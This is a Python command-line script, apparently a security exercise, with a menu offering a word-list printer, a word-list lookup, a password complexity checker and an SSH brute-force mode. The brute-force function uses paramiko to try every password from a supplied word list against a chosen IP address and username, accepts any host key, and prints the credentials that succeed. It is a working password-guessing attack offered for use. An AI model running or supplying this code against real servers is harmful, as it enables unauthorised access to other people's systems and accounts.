import string
import time
import paramiko

def offensive_mode():
    file_path = input("Enter the word list file path: ")
    delay = float(input("Enter the delay between words (in seconds): "))
    
    with open(file_path, 'r') as file:
        word_list = file.read().splitlines()

    for word in word_list:
        print(word)
        time.sleep(delay)

def defensive_mode():
    search_string = input("Enter the string to search for: ")
    file_path = input("Enter the word list file path: ")
    
    with open(file_path, 'r') as file:
        word_list = file.read().splitlines()

    if search_string in word_list:
        print("String found in the word list.")
    else:
        print("String not found in the word list.")

def complexity_mode():
    password = input("Enter a password: ")
    length_requirement = int(input("Minimum password length: "))
    capital_requirement = int(input("Minimum number of capital letters: "))
    number_requirement = int(input("Minimum number of digits: "))
    symbol_requirement = int(input("Minimum number of symbols: "))

    satisfied_metrics = []

    if len(password) >= length_requirement:
        satisfied_metrics.append("Password length")
    
    capital_count = sum(1 for char in password if char.isupper())
    if capital_count >= capital_requirement:
        satisfied_metrics.append("Capital letters")
    
    number_count = sum(1 for char in password if char.isdigit())
    if number_count >= number_requirement:
        satisfied_metrics.append("Digits")
    
    symbol_count = sum(1 for char in password if char in string.punctuation)
    if symbol_count >= symbol_requirement:
        satisfied_metrics.append("Symbols")
    
    if len(satisfied_metrics) == 4:
        print("SUCCESS: Password meets all complexity requirements.")
    else:
        print("Password complexity requirements not fully met.")
        print("Satisfied metrics:", ', '.join(satisfied_metrics))

def ssh_brute_force(ip_address, username, word_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(word_list, 'r') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        try:
            ssh.connect(ip_address, username=username, password=password)
            print("SUCCESS: Login successful!")
            print("IP Address:", ip_address)
            print("Username:", username)
            print("Password:", password)
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print("Failed attempt:", password)

    print("Login unsuccessful. Password not found in the word list.")

def main():
    print("Select a mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    print("3. Defensive; Password Complexity")
    print("4. Brute Force; SSH Authentication")
    
    mode = input("Enter the mode number: ")
    
    if mode == "1":
        offensive_mode()
    elif mode == "2":
        defensive_mode()
    elif mode == "3":
        complexity_mode()
    elif mode == "4":
        ip_address = input("Enter the IP address of the SSH server: ")
        username = input("Enter the username: ")
        word_list = input("Enter the word list file path: ")
        ssh_brute_force(ip_address, username, word_list)
    else:
        print("Invalid mode number. Please try again.")

if __name__ == "__main__":
    main()

